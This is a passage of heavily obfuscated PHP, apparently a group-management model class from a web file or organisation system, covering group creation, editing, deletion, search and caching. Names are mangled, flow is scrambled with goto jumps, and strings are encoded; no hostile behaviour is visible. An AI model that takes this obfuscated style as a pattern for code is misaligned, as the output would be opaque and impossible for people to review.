$cåÊÊ©Íèš += $D‘”˜—·Òã[$BæĞ²ñ‰ˆ‘[78]] * $D‘”˜—·Òã[$BæĞ²ñ‰ˆ‘[1750]]; $D½Ã®”™¾÷ += $D‘”˜—·Òã[$BæĞ²ñ‰ˆ‘[78]] * ($D‘”˜—·Òã[$BæĞ²ñ‰ˆ‘[1750]] - 1); $cÜéâ„ÙˆÑ += $D‘”˜—·Òã[$BæĞ²ñ‰ˆ‘[1750]]; } } $f¤ÒÍİÙ† = array($BæĞ²ñ‰ˆ‘[1756] => $cåÊÊ©Íèš, $BæĞ²ñ‰ˆ‘[1757] => $D½Ã®”™¾÷, $BæĞ²ñ‰ˆ‘[1758] => $D½Ã®”™¾÷ / $cåÊÊ©Íèš, $BæĞ²ñ‰ˆ‘[82] => $C‡ŒÉ·Â—Æ, $BæĞ²ñ‰ˆ‘[1759] => $cÜéâ„ÙˆÑ); return $f¤ÒÍİÙ†; goto a”¹ß¾‰…; a”¹ß¾‰…: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\165\x70"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\x61\x6d\145" => "\x67\x72\157\x75\160\x5f\x6d\x65\x74\x61", "\155\145\164\141\106\151\145\x6c\x64" => "\x67\162\x6f\x75\x70\x49\x44"); protected function cacheFunctionAlias($fŸ­ÃŞãÑ) { $d×—¦¡ŞµÜ =& $_SERVER[¬ı§†‰ú˜¼]; return array($d×—¦¡ŞµÜ[1760] => array($fŸ­ÃŞãÑ[0], $d×—¦¡ŞµÜ[1761]), $d×—¦¡ŞµÜ[1762] => array($fŸ­ÃŞãÑ[0], $d×—¦¡ŞµÜ[1761])); } protected function getInfo($C’ğ»ºÚñ) { $E»‰ªÆ¹â = $this->getInfoSimple($C’ğ»ºÚñ); if (!$E»‰ªÆ¹â) { return !1; } return $this->_listDataApplyItem($E»‰ªÆ¹â); } protected function getInfoSimple($aÔÂªÄ¼œ, $e¸Ê·ƒÅ¡ = false) { $B¯‹ƒŠ´• =& $_SERVER[¬ı§†‰ú˜¼]; if ($e¸Ê·ƒÅ¡) { $A²‹İÕ¤‚š = array($B¯‹ƒŠ´•[1690] => intval($aÔÂªÄ¼œ)); $eÛ©¿´ùà = $this->where($A²‹İÕ¤‚š)->find(); return is_array($eÛ©¿´ùà) ? $eÛ©¿´ùà : array(); } return $this->cacheFunctionGet($B¯‹ƒŠ´•[1763], $aÔÂªÄ¼œ); } protected function groupAdd($dí®Ÿ–Ö²¿) { goto døó…ÚÅ˜ô; cëÙ‚áÔê…: if (isset($dí®Ÿ–Ö²¿[$DÉ´¹µ¶[1766]])) { $this->metaSet($a„é©Ó‚Œ‰, array($DÉ´¹µ¶[1766] => $dí®Ÿ–Ö²¿[$DÉ´¹µ¶[1766]], $DÉ´¹µ¶[1767] => $dí®Ÿ–Ö²¿[$DÉ´¹µ¶[1767]])); unset($dí®Ÿ–Ö²¿[$DÉ´¹µ¶[1766]]); unset($dí®Ÿ–Ö²¿[$DÉ´¹µ¶[1767]]); } Model($DÉ´¹µ¶[1204])->groupRootAdd($a„é©Ó‚Œ‰); return $a„é©Ó‚Œ‰; goto dÍùºÕæì; Fè£²¤ˆ ¡: if ($F¿ª‘§¨±Ö[$DÉ´¹µ¶[485]]) { $aá‘ã•ğ»† = $F¿ª‘§¨±Ö[$DÉ´¹µ¶[485]] . $F¿ª‘§¨±Ö[$DÉ´¹µ¶[1690]] . $DÉ´¹µ¶[47]; } $d’İÚ¨ŸÄ­ = array($DÉ´¹µ¶[411] => $this->groupNameAuto($dí®Ÿ–Ö²¿[$DÉ´¹µ¶[476]], $dí®Ÿ–Ö²¿[$DÉ´¹µ¶[28]]), $DÉ´¹µ¶[393] => $dí®Ÿ–Ö²¿[$DÉ´¹µ¶[476]], $DÉ´¹µ¶[552] => $aá‘ã•ğ»†, $DÉ´¹µ¶[1764] => $dí®Ÿ–Ö²¿[$DÉ´¹µ¶[1674]], $DÉ´¹µ¶[1765] => 0, $DÉ´¹µ¶[1694] => 0); if (isset($dí®Ÿ–Ö²¿[$DÉ´¹µ¶[1713]])) { $d’İÚ¨ŸÄ­[$DÉ´¹µ¶[1713]] = $dí®Ÿ–Ö²¿[$DÉ´¹µ¶[1713]]; } else { $d¼çíé½ = $this->max($DÉ´¹µ¶[1713]); if (!$d¼çíé½) { $d¼çíé½ = 0; } $d’İÚ¨ŸÄ­[$DÉ´¹µ¶[1713]] = $d¼çíé½ + 1; } goto C„¢õö¡¨Û; C„¢õö¡¨Û: if (!empty($dí®Ÿ–Ö²¿[$DÉ´¹µ¶[1690]])) { $d’İÚ¨ŸÄ­[$DÉ´¹µ¶[1690]] = $dí®Ÿ–Ö²¿[$DÉ´¹µ¶[1690]]; } $a„é©Ó‚Œ‰ = $this->add($d’İÚ¨ŸÄ­); $this->setNamePinyin($a„é©Ó‚Œ‰, $d’İÚ¨ŸÄ­[$DÉ´¹µ¶[28]]); goto cëÙ‚áÔê…; døó…ÚÅ˜ô: $DÉ´¹µ¶ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$dí®Ÿ–Ö²¿[$DÉ´¹µ¶[476]] && isset($dí®Ÿ–Ö²¿[$DÉ´¹µ¶[1690]]) && $dí®Ÿ–Ö²¿[$DÉ´¹µ¶[1690]] == 1) { if ($F¿ª‘§¨±Ö = $this->getInfoSimple($dí®Ÿ–Ö²¿[$DÉ´¹µ¶[1690]], !0)) { return $dí®Ÿ–Ö²¿[$DÉ´¹µ¶[1690]]; } } else { $F¿ª‘§¨±Ö = $this->getInfoSimple($dí®Ÿ–Ö²¿[$DÉ´¹µ¶[476]]); if (!$F¿ª‘§¨±Ö) { return !1; } } $aá‘ã•ğ»† = $DÉ´¹µ¶[497]; goto Fè£²¤ˆ ¡; dÍùºÕæì: } protected function groupEdit($aÆŞ—®Æ„Ù, $c¿œ àôêô) { goto Fá¶êÚßÑ ; Fá¶êÚßÑ : $FİÄÄ³ÅÜ¶ =& $_SERVER[¬ı§†‰ú˜¼]; $B¿¬‚ÔÉÆ = $this->getInfoSimple($aÆŞ—®Æ„Ù); if (!$B¿¬‚ÔÉÆ) { return !1; } goto B²ãÂ‘°; aîÉÆ‰ƒ¾ï: if (isset($c¿œ àôêô[$FİÄÄ³ÅÜ¶[28]]) && $c¿œ àôêô[$FİÄÄ³ÅÜ¶[28]] != $B¿¬‚ÔÉÆ[$FİÄÄ³ÅÜ¶[28]]) { $this->_clearChildrenCache($B¿¬‚ÔÉÆ); } return $this->where(array($FİÄÄ³ÅÜ¶[1768] => $aÆŞ—®Æ„Ù))->save($c¿œ àôêô); goto f‚–‡‰‹Ûí; B²ãÂ‘°: if (!empty($c¿œ àôêô[$FİÄÄ³ÅÜ¶[476]])) { $BŞ†¯¢ˆì = $this->getInfoSimple($c¿œ àôêô[$FİÄÄ³ÅÜ¶[476]]); if (!$BŞ†¯¢ˆì) { return !1; } if ($B¿¬‚ÔÉÆ[$FİÄÄ³ÅÜ¶[1690]] == $BŞ†¯¢ˆì[$FİÄÄ³ÅÜ¶[1690]]) { return !1; } if ($c¿œ àôêô[$FİÄÄ³ÅÜ¶[476]] != $B¿¬‚ÔÉÆ[$FİÄÄ³ÅÜ¶[476]]) { if ($BŞ†¯¢ˆì[$FİÄÄ³ÅÜ¶[485]] !== $B¿¬‚ÔÉÆ[$FİÄÄ³ÅÜ¶[485]] && strpos($BŞ†¯¢ˆì[$FİÄÄ³ÅÜ¶[485]], $B¿¬‚ÔÉÆ[$FİÄÄ³ÅÜ¶[485]] . $B¿¬‚ÔÉÆ[$FİÄÄ³ÅÜ¶[1690]] . $FİÄÄ³ÅÜ¶[47]) === 0) { return !1; } $c¿œ àôêô[$FİÄÄ³ÅÜ¶[552]] = $BŞ†¯¢ˆì[$FİÄÄ³ÅÜ¶[485]] . $c¿œ àôêô[$FİÄÄ³ÅÜ¶[476]] . $FİÄÄ³ÅÜ¶[47]; $this->_changeChildLevel($B¿¬‚ÔÉÆ, $BŞ†¯¢ˆì); } } if (isset($c¿œ àôêô[$FİÄÄ³ÅÜ¶[28]])) { $this->setNamePinyin($aÆŞ—®Æ„Ù, $c¿œ àôêô[$FİÄÄ³ÅÜ¶[28]]); } if (isset($c¿œ àôêô[$FİÄÄ³ÅÜ¶[1766]])) { $this->metaSet($aÆŞ—®Æ„Ù, array($FİÄÄ³ÅÜ¶[1766] => $c¿œ àôêô[$FİÄÄ³ÅÜ¶[1766]], $FİÄÄ³ÅÜ¶[1767] => $c¿œ àôêô[$FİÄÄ³ÅÜ¶[1767]])); unset($c¿œ àôêô[$FİÄÄ³ÅÜ¶[1766]]); unset($c¿œ àôêô[$FİÄÄ³ÅÜ¶[1767]]); } goto aîÉÆ‰ƒ¾ï; f‚–‡‰‹Ûí: } private function _clearChildrenCache($d¹ÓŞôƒ) { $bÚ”Àì•È =& $_SERVER[¬ı§†‰ú˜¼]; $CÜâÄĞ›†¥ = array($bÚ”Àì•È[552] => array($bÚ”Àì•È[511], $d¹ÓŞôƒ[$bÚ”Àì•È[485]] . $d¹ÓŞôƒ[$bÚ”Àì•È[1690]] . $bÚ”Àì•È[512])); $CÚö¤»‘´î = $this->field($bÚ”Àì•È[1690])->where($CÜâÄĞ›†¥)->select(); foreach ($CÚö¤»‘´î as $CÀ÷è„³ß¿) { $this->cacheFunctionClear($bÚ”Àì•È[1769], $CÀ÷è„³ß¿[$bÚ”Àì•È[1690]]); $this->cacheFunctionClear($bÚ”Àì•È[1763], $CÀ÷è„³ß¿[$bÚ”Àì•È[1690]]); } } private function _changeChildLevel($fìÁ°ÎÀ™‡, $FÓ‚†”, $a©ïà·ñ½˜ = false) { goto cÓª‚—ßİ; cÓª‚—ßİ: $e§í·õ™íÌ =& $_SERVER[¬ı§†‰ú˜¼]; $fÒŠâ¥•¨‘ = $fìÁ°ÎÀ™‡[$e§í·õ™íÌ[485]] . $fìÁ°ÎÀ™‡[$e§í·õ™íÌ[1690]] . $e§í·õ™íÌ[47]; $FËŠ²ö§ù = $FÓ‚†”[$e§í·õ™íÌ[485]] . $FÓ‚†”[$e§í·õ™íÌ[1690]] . $e§í·õ™íÌ[47] . $fìÁ°ÎÀ™‡[$e§í·õ™íÌ[1690]] . $e§í·õ™íÌ[47]; goto DÁ˜´³¶¶; DÁ˜´³¶¶: if ($a©ïà·ñ½˜) { $FËŠ²ö§ù = $FÓ‚†”[$e§í·õ™íÌ[485]] . $FÓ‚†”[$e§í·õ™íÌ[1690]] . $e§í·õ™íÌ[47]; } $cŒ¢†Â“ä = array($e§í·õ™íÌ[552] => array($e§í·õ™íÌ[511], $fìÁ°ÎÀ™‡[$e§í·õ™íÌ[485]] . $fìÁ°ÎÀ™‡[$e§í·õ™íÌ[1690]] . $e§í·õ™íÌ[512])); $EÕ„»¨©‡Æ = array($e§í·õ™íÌ[552] => array($e§í·õ™íÌ[560], "\162\x65\160\154\x61\143\145\50\160\x61\162\145\156\x74\114\145\166\145\154\54\x27{$fÒŠâ¥•¨‘}\47\54\47{$FËŠ²ö§ù}\x27\x29")); goto c—õ¡†ØÒğ; c—õ¡†ØÒğ: $this->_clearChildrenCache($fìÁ°ÎÀ™‡); $this->where($cŒ¢†Â“ä)->data($EÕ„»¨©‡Æ)->save(); goto díö©ĞÃ‰ã; díö©ĞÃ‰ã: } public function setNamePinyin($dÕİÓàÖíÕ, $DÓö‡¨Ğºë = false) { $eÄã®Æ× ÷ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$DÓö‡¨Ğºë) { $c¿–åŸÏ‰ = $this->getInfoSimple($dÕİÓàÖíÕ); $DÓö‡¨Ğºë = $c¿–åŸÏ‰[$eÄã®Æ× ÷[28]]; } if (!Input::check($DÓö‡¨Ğºë, $eÄã®Æ× ÷[555])) { $this->metaSet($dÕİÓàÖíÕ, $eÄã®Æ× ÷[442], null); $this->metaSet($dÕİÓàÖíÕ, $eÄã®Æ× ÷[441], null); return; } $E¡ß«×Öì = array($eÄã®Æ× ÷[442] => str_replace($eÄã®Æ× ÷[50], $eÄã®Æ× ÷[33], Pinyin::encode($DÓö‡¨Ğºë)), $eÄã®Æ× ÷[441] => Pinyin::encode($DÓö‡¨Ğºë, $eÄã®Æ× ÷[556])); $this->metaSet($dÕİÓàÖíÕ, $E¡ß«×Öì); } protected function groupStatus($f‹¾´ò–¬œ, $DŒÑÚêÉ®) { goto CàŒ¥‹²Ïî; CàŒ¥‹²Ïî: $Fù¨±Õœ =& $_SERVER[¬ı§†‰ú˜¼]; $Cƒ ÎŠ‚ç = $this->getInfoSimple($f‹¾´ò–¬œ); if (!$Cƒ ÎŠ‚ç) { return !1; } goto cƒ¬¨¶¼á; cƒ¬¨¶¼á: if ($DŒÑÚêÉ® == $Fù¨±Õœ[87]) { $D¨ºĞœ—’Ó = $this->parentLevelArray($Cƒ ÎŠ‚ç[$Fù¨±Õœ[485]]); } else { $A›Ù§»•É = array($Fù¨±Õœ[552] => array($Fù¨±Õœ[511], $Cƒ ÎŠ‚ç[$Fù¨±Õœ[485]] . $Cƒ ÎŠ‚ç[$Fù¨±Õœ[1690]] . $Fù¨±Õœ[512])); $D¨ºĞœ—’Ó = $this->where($A›Ù§»•É)->field($Fù¨±Õœ[1690])->select(); $D¨ºĞœ—’Ó = array_to_keyvalue($D¨ºĞœ—’Ó, $Fù¨±Õœ[33], $Fù¨±Õœ[1690]); } $D¨ºĞœ—’Ó[] = $Cƒ ÎŠ‚ç[$Fù¨±Õœ[1690]]; $d¬×©„ò = array(); goto B’íÆ‰®Šî; B’íÆ‰®Šî: foreach ($D¨ºĞœ—’Ó as $f‹¾´ò–¬œ) { $d¬×©„ò[] = array($Fù¨±Õœ[1690] => $f‹¾´ò–¬œ, $Fù¨±Õœ[93] => $Fù¨±Õœ[714], $Fù¨±Õœ[371] => $DŒÑÚêÉ®); } return Model($Fù¨±Õœ[1770])->addAll($d¬×©„ò, array(), !0); goto dç³† –Ùò; dç³† –Ùò: } protected function groupRemove($c…†„ÉÇï) { goto B‰ğ·Š‹è£; aô†­ë±Ôá: Model($aóØµôßïã[798])->groupRootRemove($c…†„ÉÇï); return $this->where($Aç‘’îÁÆİ)->delete(); goto c£§ŠÙî‡; F‚ßñ—‰Â: $this->where(array($aóØµôßïã[476] => $c…†„ÉÇï))->save(array($aóØµôßïã[476] => $eòìªÃä¨[$aóØµôßïã[476]])); Model($aóØµôßïã[1770])->where($Aç‘’îÁÆİ)->delete(); Model($aóØµôßïã[1771])->where($Aç‘’îÁÆİ)->delete(); goto aô†­ë±Ôá; EÑ®œõÛ: if (!$eòìªÃä¨ || $eòìªÃä¨[$aóØµôßïã[476]] == 0) { return !1; } $DË¶œ“ŒÓ = $this->getInfoSimple($eòìªÃä¨[$aóØµôßïã[476]]); $this->_changeChildLevel($eòìªÃä¨, $DË¶œ“ŒÓ, !0); goto F‚ßñ—‰Â; B‰ğ·Š‹è£: $aóØµôßïã =& $_SERVER[¬ı§†‰ú˜¼]; $Aç‘’îÁÆİ = array($aóØµôßïã[1690] => $c…†„ÉÇï); $eòìªÃä¨ = $this->where($Aç‘’îÁÆİ)->find(); goto EÑ®œõÛ; c£§ŠÙî‡: } protected function groupSort($B¯Ì’¢Ïµò) { $cŸŒœ»ßš¥ =& $_SERVER[¬ı§†‰ú˜¼]; $B¯á’È¦ëË = array(); foreach ($B¯Ì’¢Ïµò as $D‚ƒ„¦´Ã² => $fäîÀ±ÒåÎ) { $B¯á’È¦ëË[] = array($cŸŒœ»ßš¥[1690], $fäîÀ±ÒåÎ, $cŸŒœ»ßš¥[1713], $D‚ƒ„¦´Ã² + 1); } $this->saveAll($B¯á’È¦ëË); } public function listData() { $CŞ ïƒÈ‚ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($CŞ ïƒÈ‚[$_SERVER[¬ı§†‰ú˜¼][366]]); return $CŞ ïƒÈ‚; } private function _makeOrder($fÕ¦“½Ü = '') { goto D„Ì†…¶ğ ; D„Ì†…¶ğ : $Eñª±ôÉ› =& $_SERVER[¬ı§†‰ú˜¼]; $aÙ‘„À¯Ç— = array($Eñª±ôÉ›[1690], $Eñª±ôÉ›[28], $Eñª±ôÉ›[1676], $Eñª±ôÉ›[193]); $C¿àÌ›¾¼± = array($Eñª±ôÉ›[426] => $Eñª±ôÉ›[427], $Eñª±ôÉ›[428] => $Eñª±ôÉ›[429]); goto d¹‰Ï­Éø»; d¹‰Ï­Éø»: $fÑ»¥’²î = Input::get($Eñª±ôÉ›[433], $Eñª±ôÉ›[7], $Eñª±ôÉ›[1694], $aÙ‘„À¯Ç—); $Fª±¡ÈÖİâ = Input::get($Eñª±ôÉ›[434], $Eñª±ôÉ›[7], $Eñª±ôÉ›[1772], array($Eñª±ôÉ›[1772], $Eñª±ôÉ›[428])); $Fª±¡ÈÖİâ = $C¿àÌ›¾¼±[$Fª±¡ÈÖİâ]; goto EÂ‡Œääå½; EÂ‡Œääå½: $fÕ¦“½Ü = $fÕ¦“½Ü . "{$fÑ»¥’²î}\40{$Fª±¡ÈÖİâ}\x2c\x20\x67\x72\x6f\165\160\111\x44\x20\141\163\143"; return $this->order($fÕ¦“½Ü); goto B¨‘÷§Ãß; B¨‘÷§Ãß: } public function listChild($B‘–ÓŸöŠ§) { $a™¤¡ÀéãŠ =& $_SERVER[¬ı§†‰ú˜¼]; $d°•Ì“àÊß = $this->where(array($a™¤¡ÀéãŠ[476] => $B‘–ÓŸöŠ§))->_makeOrder()->selectPage(200); $this->_listDataApply($d°•Ì“àÊß[$a™¤¡ÀéãŠ[366]]); return $d°•Ì“àÊß; } public function listByID($eç²óØºĞ) { $dï§–”“á™ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$eç²óØºĞ) { return array(); } $eƒãğÅÊë™ = array($dï§–”“á™[1690] => array($dï§–”“á™[7], $eç²óØºĞ)); $dŠ­¦¨ñ¸‘ = $this->where($eƒãğÅÊë™)->select(); $this->_listDataApply($dŠ­¦¨ñ¸‘); return $dŠ­¦¨ñ¸‘; } public function listSearch($fƒÏò° æ†) { goto A¬Äê‹÷”Ü; aƒ£à‚‹ÍÂ: if (!trim($CÈáÃŒêª)) { return !1; } $CÈáÃŒêª = str_replace($b¸†£Õˆò[1775], $b¸†£Õˆò[1776], $CÈáÃŒêª); $EİåÙ…ß–‚ = array($b¸†£Õˆò[1690] => array($b¸†£Õˆò[379], "{$CÈáÃŒêª}\x25"), $b¸†£Õˆò[28] => array($b¸†£Õˆò[379], "\45{$CÈáÃŒêª}\45"), $b¸†£Õˆò[956] => $b¸†£Õˆò[1777]); goto f…ÉìÔ²ª›; A¬Äê‹÷”Ü: $b¸†£Õˆò =& $_SERVER[¬ı§†‰ú˜¼]; $CÈáÃŒêª = $fƒÏò° æ†[$b¸†£Õˆò[1773]]; $c¤Õ£„´£Â = isset($fƒÏò° æ†[$b¸†£Õˆò[1774]]) ? $fƒÏò° æ†[$b¸†£Õˆò[1774]] : !1; goto aƒ£à‚‹ÍÂ; C…Ø¾î¼‰: $BÙ· İ…ø = $BÙ· İ…ø ? $BÙ· İ…ø : array($b¸†£Õˆò[366] => array(), $b¸†£Õˆò[363] => array()); if (!$BÙ· İ…ø || count($BÙ· İ…ø[$b¸†£Õˆò[366]]) < 5 && Input::check($CÈáÃŒêª, $b¸†£Õˆò[315])) { goto bñ½ñäæñ; bñ½ñäæñ: $AçË±¨¡Ä× = $this->groupChildrenAll($c¤Õ£„´£Â); $E‚æ’·½ = $this->_searchFromMeta($b¸†£Õˆò[441], $CÈáÃŒêª, 10, $AçË±¨¡Ä×); $F§º„º“‰º = $this->_searchFromMeta($b¸†£Õˆò[442], $CÈáÃŒêª, 10, $AçË±¨¡Ä×); goto FÇÊ‹…›­; FôïË¦¢ïÛ: $BÙ· İ…ø[$b¸†£Õˆò[363]][$b¸†£Õˆò[365]] = ceil($BÙ· İ…ø[$b¸†£Õˆò[363]][$b¸†£Õˆò[364]] / $BÙ· İ…ø[$b¸†£Õˆò[363]][$b¸†£Õˆò[360]]); goto aåğ‚ÚÄ”«; FÇÊ‹…›­: $C²‘ƒˆÅ˜› = array_merge($E‚æ’·½, $F§º„º“‰º, $BÙ· İ…ø[$b¸†£Õˆò[366]]); $BÙ· İ…ø[$b¸†£Õˆò[366]] = array_unique_by_key($C²‘ƒˆÅ˜›, $b¸†£Õˆò[1690]); $BÙ· İ…ø[$b¸†£Õˆò[363]][$b¸†£Õˆò[364]] = count($BÙ· İ…ø[$b¸†£Õˆò[366]]); goto FôïË¦¢ïÛ; aåğ‚ÚÄ”«: } $this->_listDataApply($BÙ· İ…ø[$b¸†£Õˆò[366]]); goto EºÏ‹©ëÑ²; EºÏ‹©ëÑ²: return $BÙ· İ…ø; goto d¨¥ŠÅÃ‹ì; f…ÉìÔ²ª›: if ($c¤Õ£„´£Â) { $F£“³¥¦Œ§ = $this->getInfoSimple($c¤Õ£„´£Â); $D…Ê‘„äÊ = $F£“³¥¦Œ§[$b¸†£Õˆò[485]] . $c¤Õ£„´£Â . $b¸†£Õˆò[512]; $EİåÙ…ß–‚ = array($EİåÙ…ß–‚, array($b¸†£Õˆò[485] => array($b¸†£Õˆò[379], $D…Ê‘„äÊ))); } $EİåÙ…ß–‚ = $this->parseWhereLike($EİåÙ…ß–‚); $BÙ· İ…ø = $this->_makeOrder()->where($EİåÙ…ß–‚)->selectPage(20); goto C…Ø¾î¼‰; d¨¥ŠÅÃ‹ì: } protected function groupChildrenAll($cˆ„´…ô÷Š) { $C§¾Æø¸‰ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$cˆ„´…ô÷Š) { return !1; } if (is_string($cˆ„´…ô÷Š)) { $cˆ„´…ô÷Š = array($cˆ„´…ô÷Š); } $DÖ—ã¸–˜¤ = $cˆ„´…ô÷Š; foreach ($cˆ„´…ô÷Š as $bö‹ğ‹ŞÜô) { $A°Àªç…æ† = $this->getInfoSimple($bö‹ğ‹ŞÜô); $B©ÙŒ¬êŠí = array($C§¾Æø¸‰[485] => array($C§¾Æø¸‰[379], $A°Àªç…æ†[$C§¾Æø¸‰[485]] . $bö‹ğ‹ŞÜô . $C§¾Æø¸‰[512])); $a°ÊÒöÇö = $this->field($C§¾Æø¸‰[1690])->where($B©ÙŒ¬êŠí)->select(); $DÖ—ã¸–˜¤ = array_merge($DÖ—ã¸–˜¤, array_to_keyvalue($a°ÊÒöÇö, $C§¾Æø¸‰[33], $C§¾Æø¸‰[1690])); } return array_unique($DÖ—ã¸–˜¤); } private function _searchFromMeta($BƒœÎ÷«ì, $e‰èš¹Å , $bìæé¥“¥Ğ, $a×›‚©ä¤„) { goto båÆÑÏ™†ñ; c‡ÔÇîè÷ï: $eÒñ”ìï³· = $this->parseWhereLike($eÒñ”ìï³·); if ($a×›‚©ä¤„) { $eÒñ”ìï³·[$C”Å½Òà­[1690]] = array($C”Å½Òà­[7], $a×›‚©ä¤„); } $A§ªŒ‘‚ŠÀ = Model($C”Å½Òà­[1778])->where($eÒñ”ìï³·)->limit($bìæé¥“¥Ğ)->select(); goto dº°Â´§; båÆÑÏ™†ñ: $C”Å½Òà­ =& $_SERVER[¬ı§†‰ú˜¼]; $e‰èš¹Å  = strtolower($e‰èš¹Å ); $eÒñ”ìï³· = array($C”Å½Òà­[93] => $BƒœÎ÷«ì, $C”Å½Òà­[371] => array($C”Å½Òà­[379], "\x25{$e‰èš¹Å }\45")); goto c‡ÔÇîè÷ï; dº°Â´§: if (!$A§ªŒ‘‚ŠÀ) { return array(); } $A§ªŒ‘‚ŠÀ = array_to_keyvalue($A§ªŒ‘‚ŠÀ, $C”Å½Òà­[33], $C”Å½Òà­[1690]); $F–Ë‘íŒ§ = $this->where(array($C”Å½Òà­[1768] => array($C”Å½Òà­[7], $A§ªŒ‘‚ŠÀ)))->select(); goto f›¨²…Š; f›¨²…Š: if (!$F–Ë‘íŒ§) { return array(); } return $F–Ë‘íŒ§; goto CÖ‹Ù†ÇÂ; CÖ‹Ù†ÇÂ: } protected function _listDataApplyItem($FºªŠ­£¼ƒ) { $aß•²„ÚÔ” = array($FºªŠ­£¼ƒ); $this->_listDataApply($aß•²„ÚÔ”); return $aß•²„ÚÔ”[0]; } protected function _listDataApply(&$Aß…†ùÓîÌ) { goto D¿ÜŒÄ»“; bù”„›©‡Î: $this->_listAppendParent($Aß…†ùÓîÌ); $this->_listAppendSourceRoot($Aß…†ùÓîÌ, $C—‚èïŞäè); goto BÚù÷à›à; D¿ÜŒÄ»“: $C‘ÉØÕ¬È =& $_SERVER[¬ı§†‰ú˜¼]; if (!$Aß…†ùÓîÌ) { return; } $C—‚èïŞäè = array_to_keyvalue($Aß…†ùÓîÌ, $C‘ÉØÕ¬È[33], $C‘ÉØÕ¬È[1690]); goto a¿¦”åÇî£; a¿¦”åÇî£: $this->_listAppendChildren($Aß…†ùÓîÌ); $this->_listAppendChildrenMember($Aß…†ùÓîÌ); $this->_listAppendMeta($Aß…†ùÓîÌ, $C—‚èïŞäè); goto bù”„›©‡Î; BÚù÷à›à: } private function _listAppendChildren(&$aéëŞÖÙ Ã) { goto cÙ¶¸àĞ‘; fØ°Æñ¯Ú¦: $DæõÄƒß¤‰ = array($d¯³ÍæÅ„İ[476], $d¯³ÍæÅ„İ[1779] => $d¯³ÍæÅ„İ[478]); $F¼·ÑÛ“œ = $this->field($DæõÄƒß¤‰)->where($cÃµ¡ÛÜÔ‡)->group($d¯³ÍæÅ„İ[476])->select(); $CÁöºõ‡ïÆ = array_to_keyvalue($F¼·ÑÛ“œ, $d¯³ÍæÅ„İ[476], $d¯³ÍæÅ„İ[478]); goto C×ÄƒÀÆÀ’; cÙ¶¸àĞ‘: $d¯³ÍæÅ„İ =& $_SERVER[¬ı§†‰ú˜¼]; $D…ï°œœ–ê = array_to_keyvalue($aéëŞÖÙ Ã, $d¯³ÍæÅ„İ[33], $d¯³ÍæÅ„İ[1690]); $cÃµ¡ÛÜÔ‡ = array($d¯³ÍæÅ„İ[476] => array($d¯³ÍæÅ„İ[7], $D…ï°œœ–ê)); goto fØ°Æñ¯Ú¦; C×ÄƒÀÆÀ’: foreach ($aéëŞÖÙ Ã as &$D‹¾§ï±Ô×) { $b¾®Ğ—´Š = $D‹¾§ï±Ô×[$d¯³ÍæÅ„İ[1690]]; $D‹¾§ï±Ô×[$d¯³ÍæÅ„İ[1780]] = isset($CÁöºõ‡ïÆ[$b¾®Ğ—´Š]) ? intval($CÁöºõ‡ïÆ[$b¾®Ğ—´Š]) : !1; } unset($D‹¾§ï±Ô×); goto e¨³¬ÈÉ; e¨³¬ÈÉ: } private function _listAppendChildrenMember(&$B–•ã’„ÆÊ) { goto F“òÒ˜ª¬; D‘’Î‡¨Ò¯: foreach ($B–•ã’„ÆÊ as &$CÄ³¶äà¿) { $fİ¡¬È… = $CÄ³¶äà¿[$CŞ¤ï¬Ì¾ˆ[1690]]; $CÄ³¶äà¿[$CŞ¤ï¬Ì¾ˆ[1781]] = isset($aŒâ°¶Ÿì[$fİ¡¬È…]) ? intval($aŒâ°¶Ÿì[$fİ¡¬È…]) : !1; } unset($CÄ³¶äà¿); goto b†òŸ³ö¤Ê; eÑî¿ŞÇ: $CŠ©¥îíÏô = array($CŞ¤ï¬Ì¾ˆ[1690], $CŞ¤ï¬Ì¾ˆ[1779] => $CŞ¤ï¬Ì¾ˆ[478]); $C³»İğ¦§ã = Model($CŞ¤ï¬Ì¾ˆ[1771])->field($CŠ©¥îíÏô)->where($eöÍÜåµØÌ)->group($CŞ¤ï¬Ì¾ˆ[1690])->select(); $aŒâ°¶Ÿì = array_to_keyvalue($C³»İğ¦§ã, $CŞ¤ï¬Ì¾ˆ[1690], $CŞ¤ï¬Ì¾ˆ[478]); goto D‘’Î‡¨Ò¯; F“òÒ˜ª¬: $CŞ¤ï¬Ì¾ˆ =& $_SERVER[¬ı§†‰ú˜¼]; $A¬Â§»²Ëù = array_to_keyvalue($B–•ã’„ÆÊ, $CŞ¤ï¬Ì¾ˆ[33], $CŞ¤ï¬Ì¾ˆ[1690]); $eöÍÜåµØÌ = array($CŞ¤ï¬Ì¾ˆ[1690] => array($CŞ¤ï¬Ì¾ˆ[7], $A¬Â§»²Ëù)); goto eÑî¿ŞÇ; b†òŸ³ö¤Ê: } private function _listAppendMeta(&$Eˆ´¯ôÁƒ¬, $DĞŞ’‚Û°›) { goto E¨¼·åŒ›¸; E¨¼·åŒ›¸: $cõ’å£ò¤é =& $_SERVER[¬ı§†‰ú˜¼]; $B‡´—Û«Ê¾ = array($cõ’å£ò¤é[1690] => array($cõ’å£ò¤é[7], $DĞŞ’‚Û°›)); $f£Å…ß„¹‚ = Model($cõ’å£ò¤é[1770])->where($B‡´—Û«Ê¾)->select(); goto Fğä®Š—; Fğä®Š—: $f£Å…ß„¹‚ = array_to_keyvalue_group($f£Å…ß„¹‚, $cõ’å£ò¤é[1690]); foreach ($f£Å…ß„¹‚ as &$CšŠ‚õ Ü) { $CšŠ‚õ Ü = array_to_keyvalue($CšŠ‚õ Ü, $cõ’å£ò¤é[93], $cõ’å£ò¤é[371]); } unset($CšŠ‚õ Ü); goto C ÛˆÜ‹»Œ; C ÛˆÜ‹»Œ: foreach ($Eˆ´¯ôÁƒ¬ as &$AÓÙ“ê×÷’) { $AÓÙ“ê×÷’[$cõ’å£ò¤é[443]] = array(); if (isset($f£Å…ß„¹‚[$AÓÙ“ê×÷’[$cõ’å£ò¤é[1690]]])) { $AÓÙ“ê×÷’[$cõ’å£ò¤é[443]] = $f£Å…ß„¹‚[$AÓÙ“ê×÷’[$cõ’å£ò¤é[1690]]]; } } unset($AÓÙ“ê×÷’); goto a¶½‹É•; a¶½‹É•: } protected function parentLevelArray($e±†…Ÿ×Å) { $FŒ‹ğ£Æ÷ =& 